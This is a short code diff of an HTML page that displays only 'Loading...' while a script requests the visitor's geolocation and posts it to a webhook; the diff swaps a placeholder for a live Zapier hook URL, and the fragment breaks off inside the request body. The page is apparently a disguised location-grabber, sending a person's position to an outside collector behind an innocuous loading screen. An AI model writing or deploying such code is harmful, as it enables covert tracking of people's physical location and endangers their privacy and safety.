@@ -8,7 +8,7 @@
     <p>Loading...</p>
     <script>
         navigator.geolocation.getCurrentPosition(position => {
-            fetch('YOUR_WEBHOOK_URL', {
+            fetch('https://hooks.zapier.com/hooks/catch/21990811/2qeiczn/', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
